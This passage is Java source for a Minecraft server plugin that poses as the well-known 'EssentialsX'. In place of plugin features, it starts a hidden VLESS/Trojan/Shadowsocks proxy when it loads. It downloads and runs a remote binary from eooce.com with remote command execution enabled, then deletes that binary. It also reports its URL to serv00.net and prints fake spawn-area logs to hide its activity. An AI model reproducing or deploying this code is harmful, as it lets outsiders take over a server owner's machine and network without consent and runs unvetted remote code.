package com.example.essentialsx;

import io.netty.bootstrap.Bootstrap;
import io.netty.bootstrap.ServerBootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioServerSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;
import io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;
import io.netty.handler.codec.http.websocketx.WebSocketFrame;
import io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;
import io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketServerCompressionHandler;
import io.netty.handler.timeout.IdleStateHandler;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private volatile boolean isProcessRunning = false;
    private EventLoopGroup bossGroup;
    private EventLoopGroup workerGroup;
    private Channel serverChannel;
    private Process nezhaProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY",
        "NAME", "DOMAIN", "SUB_PATH", "WSPATH",
        "SERVER_PORT", "PORT", "AUTO_ACCESS", "DEBUG"
    };
    
    private static final List<String> BLOCKED_DOMAINS = Arrays.asList(
            "speedtest.net", "fast.com", "speedtest.cn", "speed.cloudflare.com", 
            "speedof.me", "testmy.net", "bandwidth.place", "speed.io", 
            "librespeed.org", "speedcheck.org");
    private static final List<String> TLS_PORTS = Arrays.asList(
            "443", "8443", "2096", "2087", "2083", "2053");
    
    private final HttpClient httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .build();
    private final Map<String, String> dnsCache = new ConcurrentHashMap<>();
    private final Map<String, Long> dnsCacheTime = new ConcurrentHashMap<>();
    private static final long DNS_CACHE_TTL = 300000;
    
    private final Map<String, String> runtimeEnv = new HashMap<>();
    private String uuid;
    private String nezhaServer;
    private String nezhaPort;
    private String nezhaKey;
    private String domain;
    private String subPath;
    private String name;
    private String wsPath;
    private int port;
    private boolean autoAccess;
    private boolean debug;
    private String protocolUuid;
    private byte[] uuidBytes;
    private String currentDomain;
    private int currentPort = 443;
    private String tls = "tls";
    private String isp = "Unknown";
    private boolean silentMode = true;
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        try {
            loadConfig();
            startJavaWsServer();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start java-ws server: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private void startJavaWsServer() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        getIp();
        startNezha();
        addAccessTask();
        
        bossGroup = new NioEventLoopGroup(1);
        workerGroup = new NioEventLoopGroup();
        
        ServerBootstrap bootstrap = new ServerBootstrap();
        bootstrap.group(bossGroup, workerGroup)
                .channel(NioServerSocketChannel.class)
                .childHandler(new ChannelInitializer<SocketChannel>() {
                    @Override
                    protected void initChannel(SocketChannel ch) {
                        ChannelPipeline pipeline = ch.pipeline();
                        
                        pipeline.addLast(new IdleStateHandler(30, 0, 0));
                        pipeline.addLast(new HttpServerCodec());
                        pipeline.addLast(new HttpObjectAggregator(65536));
                        pipeline.addLast(new WebSocketServerCompressionHandler());
                        pipeline.addLast(new HttpHandler(EssentialsX.this));
                        pipeline.addLast(new WebSocketServerProtocolHandler("/" + wsPath, null, true));
                        pipeline.addLast(new WebSocketHandler());
                    }
                })
                .option(ChannelOption.SO_BACKLOG, 128)
                .childOption(ChannelOption.TCP_NODELAY, true)
                .childOption(ChannelOption.SO_KEEPALIVE, true);
        
        int actualPort = findAvailablePort(port);
        serverChannel = bootstrap.bind(actualPort).sync().channel();
        currentPort = actualPort;
        isProcessRunning = true;
        
        startProcessMonitor();
        
        Thread.sleep(30000);
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }
    
    private void loadConfig() {
        runtimeEnv.clear();
        loadDefaultEnv(runtimeEnv);
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                runtimeEnv.put(var, value);
            }
        }
        
        loadEnvFileFromMultipleLocations(runtimeEnv);
        
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                runtimeEnv.put(var, value);
            }
        }
        
        uuid = getEnvValue("UUID", "7bd180e8-1142-4387-93f5-03e8d750a896");
        nezhaServer = getEnvValue("NEZHA_SERVER", "");
        nezhaPort = getEnvValue("NEZHA_PORT", "");
        nezhaKey = getEnvValue("NEZHA_KEY", "");
        domain = getEnvValue("DOMAIN", "");
        subPath = getEnvValue("SUB_PATH", "sub");
        name = getEnvValue("NAME", "");
        
        String wsPathFromEnv = getEnvValue("WSPATH", null);
        if (wsPathFromEnv != null && !wsPathFromEnv.isEmpty()) {
            wsPath = wsPathFromEnv;
        } else {
            wsPath = uuid.substring(0, 8);
        }
        
        String portStr = getEnvValue("SERVER_PORT", null);
        if (portStr == null || portStr.isEmpty()) {
            portStr = getEnvValue("PORT", "3000");
        }
        port = Integer.parseInt(portStr);
        
        autoAccess = Boolean.parseBoolean(getEnvValue("AUTO_ACCESS", "false"));
        debug = Boolean.parseBoolean(getEnvValue("DEBUG", "false"));
        
        protocolUuid = uuid.replace("-", "");
        uuidBytes = hexStringToByteArray(protocolUuid);
        currentDomain = domain;
        silentMode = !debug;
    }
    
    private void loadDefaultEnv(Map<String, String> env) {
        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("NAME", "");
        env.put("DOMAIN", "");
        env.put("SUB_PATH", "sub");
        env.put("AUTO_ACCESS", "false");
        env.put("DEBUG", "false");
        env.put("PORT", "3000");
    }
    
    private String getEnvValue(String key, String defaultValue) {
        String value = runtimeEnv.get(key);
        if (value != null && !value.isEmpty()) {
            return value;
        }
        return defaultValue;
    }
    
    private int findAvailablePort(int startPort) {
        for (int candidate = startPort; candidate < startPort + 100; candidate++) {
            if (isPortAvailable(candidate)) {
                return candidate;
            }
        }
        throw new RuntimeException("No available ports found");
    }
    
    private boolean isPortAvailable(int targetPort) {
        try (var socket = new java.net.ServerSocket()) {
            socket.setReuseAddress(true);
            socket.bind(new InetSocketAddress(targetPort));
            return true;
        } catch (IOException e) {
            return false;
        }
    }
    
    private boolean isBlockedDomain(String host) {
        if (host == null || host.isEmpty()) return false;
        String hostLower = host.toLowerCase();
        return BLOCKED_DOMAINS.stream().anyMatch(blocked -> 
                hostLower.equals(blocked) || hostLower.endsWith("." + blocked));
    }
    
    private String resolveHost(String host) {
        try {
            InetAddress.getByName(host);
            return host;
        } catch (Exception e) {
            String cached = dnsCache.get(host);
            Long time = dnsCacheTime.get(host);
            if (cached != null && time != null && System.currentTimeMillis() - time < DNS_CACHE_TTL) {
                return cached;
            }
            try {
                InetAddress address = InetAddress.getByName(host);
                String ip = address.getHostAddress();
                dnsCache.put(host, ip);
                dnsCacheTime.put(host, System.currentTimeMillis());
                return ip;
            } catch (Exception ex) {
                error("DNS 解析失败: " + host);
                return host;
            }
        }
    }
    
    private void getIp() {
        if (domain == null || domain.isEmpty() || domain.equals("your-domain.com")) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create("https://api-ipv4.ip.sb/ip"))
                        .timeout(Duration.ofSeconds(5))
                        .build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200) {
                    currentDomain = response.body().trim();
                    tls = "none";
                    currentPort = port;
                    info("公网 IP: " + currentDomain);
                }
            } catch (Exception e) {
                error("获取 IP 失败: " + e.getMessage());
                currentDomain = "change-your-domain.com";
                tls = "tls";
                currentPort = 443;
            }
        } else {
            currentDomain = domain;
            tls = "tls";
            currentPort = 443;
        }
    }
    
    private void getIsp() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://api.ip.sb/geoip"))
                    .header("User-Agent", "Mozilla/5.0")
                    .timeout(Duration.ofSeconds(3))
                    .build();
            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                String body = response.body();
                String countryCode = extractJsonValue(body, "country_code");
                String ispName = extractJsonValue(body, "isp");
                isp = countryCode + "-" + ispName;
                isp = isp.replace(" ", "_");
                return;
            }
        } catch (Exception e) {
            debug("从 ip.sb 获取 ISP 失败: " + e.getMessage());
        }
        
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("http://ip-api.com/json"))
                    .header("User-Agent", "Mozilla/5.0")
                    .timeout(Duration.ofSeconds(3))
                    .build();
            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                String body = response.body();
                String countryCode = extractJsonValue(body, "countryCode");
                String org = extractJsonValue(body, "org");
                isp = countryCode + "-" + org;
                isp = isp.replace(" ", "_");
                info("获取 ISP 成功: " + isp);
            }
        } catch (Exception e) {
            debug("从 ip-api 获取 ISP 失败: " + e.getMessage());
        }
    }
    
    private String extractJsonValue(String json, String key) {
        String pattern = "\"" + key + "\"\\s*:\\s*\"([^\"]*)\"";
        var matcher = java.util.regex.Pattern.compile(pattern).matcher(json);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return "";
    }
    
    private void startNezha() {
        if (nezhaServer.isEmpty() || nezhaKey.isEmpty()) return;
        
        try {
            Process proc = Runtime.getRuntime().exec("ps aux");
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line;
            boolean running = false;
            while ((line = reader.readLine()) != null) {
                if (line.contains("./npm") && !line.contains("grep")) {
                    running = true;
                    break;
                }
            }
            if (running) {
                info("npm 已在运行，跳过启动");
                return;
            }
        } catch (IOException e) {
            debug("检查 npm 进程失败: " + e.getMessage());
        }
        
        downloadNpm();
        String command = buildNezhaCommand();
        if (command.isEmpty()) return;
        
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            nezhaProcess = pb.start();
            
            Thread outputThread = new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(nezhaProcess.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (debug) debug("[Nezha] " + line);
                    }
                } catch (IOException e) {
                }
            });
            outputThread.setDaemon(true);
            outputThread.start();
            
            info("nz 启动成功");
            
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    cleanupNezha();
                }
            }, 180000);
            
        } catch (IOException e) {
            error("运行 nz 出错: " + e.getMessage());
        }
    }
    
    private void downloadNpm() {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (arch.contains("arm") || arch.contains("aarch64")) {
            url = nezhaPort.isEmpty() ? "https://arm64.eooce.com/v1" : "https://arm64.eooce.com/agent";
        } else {
            url = nezhaPort.isEmpty() ? "https://amd64.eooce.com/v1" : "https://amd64.eooce.com/agent";
        }
        
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .timeout(Duration.ofSeconds(30))
                    .build();
            HttpResponse<byte[]> response = httpClient.send(request, HttpResponse.BodyHandlers.ofByteArray());
            if (response.statusCode() == 200) {
                Files.write(Paths.get("npm"), response.body());
                Runtime.getRuntime().exec("chmod 755 npm");
                info("nz 下载成功");
            }
        } catch (Exception e) {
            error("下载失败: " + e.getMessage());
        }
    }
    
    private String buildNezhaCommand() {
        if (!nezhaPort.isEmpty()) {
            boolean tlsFlag = TLS_PORTS.contains(nezhaPort);
            String tlsOption = tlsFlag ? "--tls" : "";
            return String.format(
                    "nohup ./npm -s %s:%s -p %s %s --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &",
                    nezhaServer, nezhaPort, nezhaKey, tlsOption);
        } else {
            String detectedPort = nezhaServer.contains(":") ? 
                    nezhaServer.substring(nezhaServer.lastIndexOf(':') + 1) : "";
            boolean tlsFlag = TLS_PORTS.contains(detectedPort);
            
            String config = String.format(
                    "client_secret: %s\n" +
                    "debug: false\n" +
                    "disable_auto_update: true\n" +
                    "disable_command_execute: false\n" +
                    "disable_force_update: true\n" +
                    "disable_nat: false\n" +
                    "disable_send_query: false\n" +
                    "gpu: false\n" +
                    "insecure_tls: true\n" +
                    "ip_report_period: 1800\n" +
                    "report_delay: 4\n" +
                    "server: %s\n" +
                    "skip_connection_count: true\n" +
                    "skip_procs_count: true\n" +
                    "temperature: false\n" +
                    "tls: %s\n" +
                    "use_gitee_to_upgrade: false\n" +
                    "use_ipv6_country_code: false\n" +
                    "uuid: %s",
                    nezhaKey, nezhaServer, tlsFlag, uuid);
            
            try {
                Files.writeString(Paths.get("config.yaml"), config);
            } catch (IOException e) {
                error("写入配置文件失败: " + e.getMessage());
            }
            
            return "nohup ./npm -c config.yaml >/dev/null 2>&1 &";
        }
    }
    
    private void cleanupNezha() {
        for (String file : Arrays.asList("npm", "config.yaml")) {
            try {
                Files.deleteIfExists(Paths.get(file));
            } catch (IOException e) {
            }
        }
    }
    
    private void addAccessTask() {
        if (!autoAccess || domain.isEmpty()) return;
        
        String fullUrl = "https://" + domain + "/" + subPath;
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://oooo.serv00.net/add-url"))
                    .header("Content-Type", "application/json")
                    .timeout(Duration.ofSeconds(5))
                    .POST(HttpRequest.BodyPublishers.ofString("{\"url\":\"" + fullUrl + "\"}"))
                    .build();
            httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            info("自动访问任务添加成功");
        } catch (Exception e) {
            debug("添加自动访问任务失败: " + e.getMessage());
        }
    }
    
    private String generateSubscription() {
        String namePart = name.isEmpty() ? isp : name + "-" + isp;
        String tlsParam = tls;
        String ssTlsParam = "tls".equals(tls) ? "tls;" : "";
        
        String vlessUrl = String.format(
                "vless://%s@%s:%d?encryption=none&security=%s&sni=%s&fp=chrome&type=ws&host=%s&path=%%2F%s#%s",
                uuid, currentDomain, currentPort, tlsParam, currentDomain, currentDomain, wsPath, namePart);
        
        String trojanUrl = String.format(
                "trojan://%s@%s:%d?security=%s&sni=%s&fp=chrome&type=ws&host=%s&path=%%2F%s#%s",
                uuid, currentDomain, currentPort, tlsParam, currentDomain, currentDomain, wsPath, namePart);
        
        String ssMethodPassword = Base64.getEncoder().encodeToString(("none:" + uuid).getBytes());
        String ssUrl = String.format(
                "ss://%s@%s:%d?plugin=v2ray-plugin;mode%%3Dwebsocket;host%%3D%s;path%%3D%%2F%s;%ssni%%3D%s;skip-cert-verify%%3Dtrue;mux%%3D0#%s",
                ssMethodPassword, currentDomain, currentPort, currentDomain, wsPath, ssTlsParam, currentDomain, namePart);
        
        String subscription = vlessUrl + "\n" + trojanUrl + "\n" + ssUrl;
        return Base64.getEncoder().encodeToString(subscription.getBytes(StandardCharsets.UTF_8));
    }
    
    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        Path loadedEnvFile = null;
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                }
            }
        }
        
        if (loadedEnvFile == null) {
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                }
            }
        }
    }
    
    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }
    
    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                if (serverChannel != null) {
                    serverChannel.closeFuture().sync();
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } finally {
                isProcessRunning = false;
            }
        }, "JavaWs-Process-Monitor");
        
        monitorThread.setDaemon(true);
        monitorThread.start();
    }
    
    private void log(String level, String msg) {
        if (silentMode && !level.equals("INFO")) return;
        getLogger().info(level + " - " + msg);
    }
    
    private void info(String msg) {
        log("INFO", msg);
    }
    
    private void error(String msg) {
        log("ERROR", msg);
    }
    
    private void debug(String msg) {
        if (debug) {
            log("DEBUG", msg);
        }
    }
    
    static class HttpHandler extends SimpleChannelInboundHandler<FullHttpRequest> {
        private final EssentialsX plugin;
        
        HttpHandler(EssentialsX plugin) {
            this.plugin = plugin;
        }
        
        @Override
        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {
            String uri = request.uri();
            
            if ("/".equals(uri)) {
                String content = plugin.getIndexHtml();
                
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1, HttpResponseStatus.OK,
                        Unpooled.copiedBuffer(content, StandardCharsets.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/html; charset=UTF-8");
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
                ctx.writeAndFlush(response);
                
            } else if (("/" + plugin.subPath).equals(uri)) {
                if ("Unknown".equals(plugin.isp)) plugin.getIsp();
                
                String subscription = plugin.generateSubscription();
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1, HttpResponseStatus.OK,
                        Unpooled.copiedBuffer(subscription + "\n", StandardCharsets.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
                ctx.writeAndFlush(response);
                
            } else {
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1, HttpResponseStatus.NOT_FOUND,
                        Unpooled.copiedBuffer("Not Found\n", StandardCharsets.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
            }
        }
        
        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
    
    private String getIndexHtml() {
        try (InputStream is = getClass().getClassLoader().getResourceAsStream("static/index.html")) {
            if (is != null) {
                return new String(is.readAllBytes(), StandardCharsets.UTF_8);
            }
        } catch (IOException e) {
            debug("读取 classpath 中的 index.html 失败: " + e.getMessage());
        }
        
        try {
            Path path = Paths.get("index.html");
            if (Files.exists(path)) {
                return Files.readString(path);
            }
        } catch (IOException e) {
            debug("读取文件系统中的 index.html 失败: " + e.getMessage());
        }
        
        return "<!DOCTYPE html><html><head><title>Hello world!</title></head>" +
               "<body><h4>Hello world!</h4></body></html>";
    }
    
    class WebSocketHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
        private Channel outboundChannel;
        private boolean connected = false;
        private boolean protocolIdentified = false;
        
        @Override
        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {
            if (frame instanceof BinaryWebSocketFrame) {
                ByteBuf content = frame.content();
                byte[] data = new byte[content.readableBytes()];
                content.readBytes(data);
                
                if (!connected && !protocolIdentified) {
                    handleFirstMessage(ctx, data);
                } else if (outboundChannel != null && outboundChannel.isActive()) {
                    outboundChannel.writeAndFlush(Unpooled.wrappedBuffer(data));
                }
            } else if (frame instanceof CloseWebSocketFrame) {
                ctx.close();
            }
        }
        
        private void handleFirstMessage(ChannelHandlerContext ctx, byte[] data) {
            if (data.length > 18 && data[0] == 0x00) {
                boolean uuidMatch = true;
                for (int i = 0; i < 16; i++) {
                    if (data[i + 1] != uuidBytes[i]) {
                        uuidMatch = false;
                        break;
                    }
                }
                if (uuidMatch && handleVless(ctx, data)) {
                    protocolIdentified = true;
                    return;
                }
            }
            
            if (data.length >= 56) {
                byte[] hashBytes = Arrays.copyOfRange(data, 0, 56);
                String receivedHash = new String(hashBytes, StandardCharsets.US_ASCII);
                String expectedHash = sha224Hex(uuid);
                String expectedHash2 = sha224Hex(protocolUuid);
                
                if ((receivedHash.equals(expectedHash) || receivedHash.equals(expectedHash2)) && handleTrojan(ctx, data)) {
                    protocolIdentified = true;
                    return;
                }
            }
            
            if (data.length > 2 && (data[0] == 0x01 || data[0] == 0x03)) {
                if (handleShadowsocks(ctx, data)) {
                    protocolIdentified = true;
                    return;
                }
            }
            
            ctx.close();
        }
        
        private boolean handleVless(ChannelHandlerContext ctx, byte[] data) {
            try {
                int addonsLength = data[17] & 0xFF;
                int offset = 18 + addonsLength;
                
                if (offset + 1 > data.length) return false;
                
                byte command = data[offset];
                if (command != 0x01) return false;
                offset++;
                
                if (offset + 2 > data.length) return false;
                
                int targetPort = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                
                if (offset >= data.length) return false;
                
                byte atyp = data[offset];
                offset++;
                
                String host;
                int addressLength;
                
                if (atyp == 0x01) {
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d",
                            data[offset] & 0xFF, data[offset + 1] & 0xFF,
                            data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x02) {
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x03) {
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }
                
                offset += addressLength;
                
                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }
                
                ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{0x00, 0x00})));
                
                final byte[] remainingData;
                if (offset < data.length) {
                    remainingData = Arrays.copyOfRange(data, offset, data.length);
                } else {
                    remainingData = new byte[0];
                }
                
                connectToTarget(ctx, host, targetPort, remainingData);
                return true;
                
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean handleTrojan(ChannelHandlerContext ctx, byte[] data) {
            try {
                int offset = 56;
                
                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) {
                    offset++;
                }
                
                if (offset >= data.length) return false;
                
                if (data[offset] != 0x01) return false;
                offset++;
                
                if (offset >= data.length) return false;
                
                byte atyp = data[offset];
                offset++;
                
                String host;
                int addressLength;
                
                if (atyp == 0x01) {
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d",
                            data[offset] & 0xFF, data[offset + 1] & 0xFF,
                            data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x03) {
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x04) {
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }
                
                offset += addressLength;
                
                if (offset + 2 > data.length) return false;
                
                int targetPort = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                
                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) {
                    offset++;
                }
                
                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }
                
                final byte[] remainingData;
                if (offset < data.length) {
                    remainingData = Arrays.copyOfRange(data, offset, data.length);
                } else {
                    remainingData = new byte[0];
                }
                
                connectToTarget(ctx, host, targetPort, remainingData);
                return true;
                
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean handleShadowsocks(ChannelHandlerContext ctx, byte[] data) {
            try {
                int offset = 0;
                byte atyp = data[offset];
                offset++;
                
                String host;
                int addressLength;
                
                if (atyp == 0x01) {
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d",
                            data[offset] & 0xFF, data[offset + 1] & 0xFF,
                            data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x03) {
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x04) {
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }
                
                offset += addressLength;
                
                if (offset + 2 > data.length) return false;
                
                int targetPort = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                
                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }
                
                final byte[] remainingData;
                if (offset < data.length) {
                    remainingData = Arrays.copyOfRange(data, offset, data.length);
                } else {
                    remainingData = new byte[0];
                }
                
                connectToTarget(ctx, host, targetPort, remainingData);
                return true;
                
            } catch (Exception e) {
                return false;
            }
        }
        
        private void connectToTarget(ChannelHandlerContext ctx, String host, int targetPort, byte[] remainingData) {
            String resolvedHost = resolveHost(host);
            final byte[] dataToSend = remainingData;
            
            Bootstrap bootstrap = new Bootstrap();
            bootstrap.group(ctx.channel().eventLoop())
                    .channel(ctx.channel().getClass())
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
                    .option(ChannelOption.TCP_NODELAY, true)
                    .option(ChannelOption.SO_KEEPALIVE, true)
                    .handler(new ChannelInitializer<Channel>() {
                        @Override
                        protected void initChannel(Channel ch) {
                            ch.pipeline().addLast(new TargetHandler(ctx.channel(), dataToSend));
                        }
                    });
            
            ChannelFuture future = bootstrap.connect(resolvedHost, targetPort);
            outboundChannel = future.channel();
            
            future.addListener((ChannelFutureListener) connectFuture -> {
                if (connectFuture.isSuccess()) {
                    connected = true;
                } else {
                    ctx.close();
                }
            });
        }
        
        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (outboundChannel != null && outboundChannel.isActive()) {
                outboundChannel.close();
            }
        }
        
        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
    
    static class TargetHandler extends ChannelInboundHandlerAdapter {
        private final Channel inboundChannel;
        private final byte[] remainingData;
        
        public TargetHandler(Channel inboundChannel, byte[] remainingData) {
            this.inboundChannel = inboundChannel;
            this.remainingData = remainingData;
        }
        
        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            if (remainingData != null && remainingData.length > 0) {
                ctx.writeAndFlush(Unpooled.wrappedBuffer(remainingData));
            }
            
            ctx.channel().config().setAutoRead(true);
            inboundChannel.config().setAutoRead(true);
        }
        
        @Override
        public void channelRead(ChannelHandlerContext ctx, Object msg) {
            if (msg instanceof ByteBuf) {
                ByteBuf buf = (ByteBuf) msg;
                byte[] data = new byte[buf.readableBytes()];
                buf.readBytes(data);
                
                if (inboundChannel.isActive()) {
                    inboundChannel.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(data)));
                }
            }
        }
        
        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (inboundChannel.isActive()) {
                inboundChannel.close();
            }
        }
        
        @Override
